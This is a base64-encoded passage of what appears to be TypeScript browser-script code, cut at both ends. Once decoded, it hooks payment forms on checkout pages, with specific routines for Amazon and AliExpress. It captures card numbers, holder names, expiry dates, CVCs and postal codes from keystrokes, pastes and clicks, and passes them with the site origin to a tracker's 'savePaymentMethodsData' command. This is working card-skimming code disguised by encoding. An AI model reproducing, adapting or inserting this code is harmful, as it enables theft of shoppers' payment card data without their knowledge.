RlKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fYXR0cmlidXRlLm5vZGVWYWx1ZS5sZW5ndGggIT09IDAgJiYgX19hdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCA+PSAzKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRFbGVtZW50c0F0dHJpYnV0ZS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlS2V5d29yZDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoX19lbGlnaWJsZUtleXdvcmQpLmxlbmd0aCAhPT0gMCAmJiBfX2VsaWdpYmxlS2V5d29yZC5jb25zdHJ1Y3RvciA9PT0gT2JqZWN0KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoX19lbGlnaWJsZUtleXdvcmQpLmZvckVhY2goZnVuY3Rpb24gKF9fY2FyZERhdGFLZXkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19lbGlnaWJsZUtleXdvcmRbX19jYXJkRGF0YUtleV0uZm9yRWFjaChmdW5jdGlvbiAoX19xS2V5OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2F0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xICYmIF9fYXR0cmlidXRlLm5vZGVWYWx1ZS50b0xvd2VyQ2FzZSgpLmluZGV4T2YoJ25vbmUnIHx8ICdoaWRkZW4nIHx8ICdkaXNhYmxlJykgPT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgWydzdWJtaXQnLCAnYnV0dG9uJ10uZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUNvbGxlY3RvckVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC50eXBlID09PSBfX2VsaWdpYmxlQ29sbGVjdG9yRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucmVzb2x2ZVBheW1lbnRFdmVudChzZWxmLCBfX2NoaWxkRWxlbWVudC5mb3JtLCBfX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIHJldHVybiBzZWxmLmNyYXdsUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIGVsZW1lbnRzLCBfX2NoaWxkRWxlbWVudCk7XG4gICAgICAgIH0pO1xuICAgIH1cblxuXG4gICAgLyogUEFTU0VEXG4gICAgKiBodHRwczovL3d3dy50dW5uZWxiZWFyLmNvbS9hY2NvdW50L2NoZWNrb3V0XG4gICAgKiBodHRwczovL3d3dy5hbWF6b24uY29tL2NwZS95b3VycGF5bWVudHMvd2FsbGV0XG4gICAgKiAqL1xuXG5cbiAgICByZXNvbHZlUGF5bWVudEV2ZW50KHNlbGY6IHRoaXMsIF9fZm9ybUVsZW1lbnQ6IGFueSwgX19kYXRhQ29sbGVjdG9yRWxlbWVudDogYW55LCBhcnJheTogYW55IFtdKSB7XG4gICAgICAgIFsnc3VibWl0J10uZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRXZlbnQpIHtcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihfX2Zvcm1FdmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgIHNlbGYuY29sbGVjdFBheW1lbnREYXRhKHNlbGYsIGFycmF5KTtcbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9KTtcbiAgICAgICAgWydjbGljaycsICdkYmxjbGljaycsICdvbnRvdWNoc3RhcnQnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2RhdGFDb2xsZWN0b3JFdmVudCkge1xuICAgICAgICAgICAgX19kYXRhQ29sbGVjdG9yRWxlbWVudC5hZGRFdmVudExpc3RlbmVyKF9fZGF0YUNvbGxlY3RvckV2ZW50LCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgc2VsZi5jb2xsZWN0UGF5bWVudERhdGEoc2VsZiwgYXJyYXkpO1xuICAgICAgICAgICAgfSk7XG4gICAgICAgIH0pO1xuXG5cbiAgICAgICAgdHJ5IHtcbiAgICAgICAgICAgIGlmICh3aW5kb3cuc2VsZiAhPT0gd2luZG93LnRvcCkge1xuICAgICAgICAgICAgICAgIG5ldyBTZXQoYXJyYXkpLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgWydrZXl1cCcsICdrZXlkb3duJywgJ2NoYW5nZScsICdwYXN0ZSddLmZvckVhY2goZnVuY3Rpb24gKF9fZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWRFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoX19ldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY29sbGVjdFBheW1lbnREYXRhKHNlbGYsIGFycmF5KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfVxuICAgICAgICB9IGNhdGNoIChlKSB7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBjb2xsZWN0UGF5bWVudERhdGEoc2VsZjogdGhpcywgYXJyYXk6IGFueSBbXSkge1xuICAgICAgICBsZXQgZWxlbWVudE5vZGU6IGFueSwgZWxlbWVudE5hbWU6IGFueSwgZWxlbWVudFR5cGU6IGFueSwgZWxlbWVudFZhbHVlOiBhbnk7XG4gICAgICAgIG5ldyBTZXQoYXJyYXkpLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgIFsuLi5fX2RldGVjdGVkRWxlbWVudC5hdHRyaWJ1dGVzXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2F0dHJpYnV0ZSkge1xuICAgICAgICAgICAgICAgIGlmIChfX2F0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoICE9PSAwICYmIF9fYXR0cmlidXRlLm5vZGVWYWx1ZS5sZW5ndGggPj0gMykge1xuICAgICAgICAgICAgICAgICAgICBwYXltZW50RWxlbWVudHNBdHRyaWJ1dGUuZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUtleXdvcmQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKF9fZWxpZ2libGVLZXl3b3JkKS5sZW5ndGggIT09IDAgJiYgX19lbGlnaWJsZUtleXdvcmQuY29uc3RydWN0b3IgPT09IE9iamVjdCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5rZXlzKF9fZWxpZ2libGVLZXl3b3JkKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2NhcmREYXRhS2V5KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZWxpZ2libGVLZXl3b3JkW19fY2FyZERhdGFLZXldLmZvckVhY2goZnVuY3Rpb24gKF9fcUtleTogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19hdHRyaWJ1dGUubm9kZVZhbHVlLnRvTG93ZXJDYXNlKCkuaW5kZXhPZihfX3FLZXkpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnROb2RlID0gX19kZXRlY3RlZEVsZW1lbnQ7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudE5hbWUgPSBfX2NhcmREYXRhS2V5O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRUeXBlID0gX19kZXRlY3RlZEVsZW1lbnQudHlwZTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50VmFsdWUgPSBfX2RldGVjdGVkRWxlbWVudC52YWx1ZTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgaWYgKGVsZW1lbnRWYWx1ZS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICBzZWxmLmNyZWRpdENhcmRTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgbm9kZTogZWxlbWVudE5vZGUsXG4gICAgICAgICAgICAgICAgICAgIG5hbWU6IGVsZW1lbnROYW1lLFxuICAgICAgICAgICAgICAgICAgICB0eXBlOiBlbGVtZW50VHlwZSxcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGVsZW1lbnRWYWx1ZVxuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICAgICAgc2VsZi5yZXRyaWV2ZUFjY3VyYXRlRGF0YShzZWxmLCBzZWxmLmNyZWRpdENhcmRTdG9yZSk7XG4gICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBzZWxmLmNyZWRpdENhcmRSdW50aW1lTnVtYmVyICE9PSAnJyA/IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVOdW1iZXIgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVCcmFuZCAhPT0gJycgPyBzZWxmLmNyZWRpdENhcmRSdW50aW1lQnJhbmQgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBzZWxmLmNyZWRpdENhcmRSdW50aW1lSG9sZGVyTmFtZSAhPT0gJycgPyBzZWxmLmNyZWRpdENhcmRSdW50aW1lSG9sZGVyTmFtZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICBcImNhcmRFeHBpcmVcIjogc2VsZi5jcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGUgIT09ICcnID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGUvKi5zdWJzdHJpbmcoMCwgc2VsZi5jcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGUubGVuZ3RoIC0gMSkqLyA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVDdmMgIT09ICcnID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUN2YyA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgIH1cbiAgICAgICAgfSk7XG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFN0b3JlID0gW107XG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVIb2xkZXJOYW1lID0gJyc7XG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVOdW1iZXIgPSAnJztcbiAgICAgICAgc2VsZi5jcmVkaXRDYXJkUnVudGltZUJyYW5kID0gJyc7XG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVFeHBpcmVEYXRlID0gJyc7XG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVDdmMgPSAnJztcbiAgICAgICAgc2VsZi5jcmVkaXRDYXJkUnVudGltZVBvc3RhbENvZGUgPSAnJztcbiAgICAgICAgLy9zZWxmLnZlcmlmeUZvcm1FbGVtZW50KHNlbGYpO1xuICAgIH1cblxuICAgIHJldHJpZXZlQWNjdXJhdGVEYXRhKHNlbGY6IHRoaXMsIF9fY3JlZGl0Q2FyZERhdGFTdG9yZTogYW55IFtdKSB7XG4gICAgICAgIGlmIChfX2NyZWRpdENhcmREYXRhU3RvcmUubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBfX2NyZWRpdENhcmREYXRhU3RvcmUuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZERhdGFFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgKF9fZGV0ZWN0ZWREYXRhRWxlbWVudC5uYW1lID09PSAnY2FyZE51bWJlcicpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZU51bWJlciA9IF9fZGV0ZWN0ZWREYXRhRWxlbWVudC52YWx1ZSA6ICcnO1xuICAgICAgICAgICAgICAgIChfX2RldGVjdGVkRGF0YUVsZW1lbnQubmFtZSA9PT0gJ2NhcmRIb2xkZXInKSA/IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVIb2xkZXJOYW1lICs9IF9fZGV0ZWN0ZWREYXRhRWxlbWVudC52YWx1ZSArICcgJyA6ICcnO1xuICAgICAgICAgICAgICAgIChfX2RldGVjdGVkRGF0YUVsZW1lbnQubmFtZSA9PT0gJ2NhcmRCcmFuZCcpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUJyYW5kID0gX19kZXRlY3RlZERhdGFFbGVtZW50LnZhbHVlIDogJyc7XG4gICAgICAgICAgICAgICAgKF9fZGV0ZWN0ZWREYXRhRWxlbWVudC5uYW1lID09PSAnY2FyZEV4cGlyZScpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGUgKz0gX19kZXRlY3RlZERhdGFFbGVtZW50LnZhbHVlICsgJy8nIDogJyc7XG4gICAgICAgICAgICAgICAgKF9fZGV0ZWN0ZWREYXRhRWxlbWVudC5uYW1lID09PSAnY2FyZENWQycpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUN2YyA9IF9fZGV0ZWN0ZWREYXRhRWxlbWVudC52YWx1ZSA6ICcnO1xuICAgICAgICAgICAgICAgIChfX2RldGVjdGVkRGF0YUVsZW1lbnQubmFtZSA9PT0gJ2NhcmRQb3N0YWxDb2RlJykgPyBzZWxmLmNyZWRpdENhcmRSdW50aW1lUG9zdGFsQ29kZSA9IF9fZGV0ZWN0ZWREYXRhRWxlbWVudC52YWx1ZSA6ICcnO1xuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBiYWNrdXBTY3JpcHRzKHNlbGY6IHRoaXMpIHtcbiAgICAgICAgbGV0IGludGVydmFsMSA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2FtYXpvbicpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZUFtYXpvblBheW1lbnRDb250YWluZXIoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdhbGlleHByZXNzJykgIT09IC0xKSB7XG5cbiAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290JykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290Jyk/LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAxKSB7XG4gICAgICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbDQgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnRpdGxlLXRvLWRldGFpbCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudGl0bGUtdG8tZGV0YWlsJyk/LnRleHRDb250ZW50Py5pbmRleE9mKCdBZGQgYSBuZXcgY2FyZCcpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZE9uU2Vjb25kUGF5bWVudChzZWxmKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYmluZC1idXR0b24td3JhcCAnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmRPblNlY29uZFBheW1lbnQoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2hlY2stb3V0LXJvb3QnKSBhcyBIVE1MRWxlbWVudCksICdzcGFuJywgJ3BheW1lbnQtdGl0bGUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IEhUTUxFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYmluZC1idXR0b24td3JhcCcpPy5maXJzdEVsZW1lbnRDaGlsZD8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogX19kZXRlY3RlZEVsZW1lbnQudGV4dENvbnRlbnQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZignY29uZmlybV9vcmRlci5odG0nKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGludGVydmFsMDAgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5wYXktdHlwZS5zaG93LW1ldGhvZCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwwMCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnBheS10eXBlLnNob3ctbWV0aG9kJyk/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgX19pbnRlcnZhbDMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChfX2ludGVydmFsMyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50TmV3Q2FyZChzZWxmLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSBhcyBIVE1MRWxlbWVudCksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gKGVsZW1lbnRzOiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2RTdG9yZTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5zYXZlJyk/LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoZWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IGVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IGVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogZWxlbWVudC50eXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBlbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHt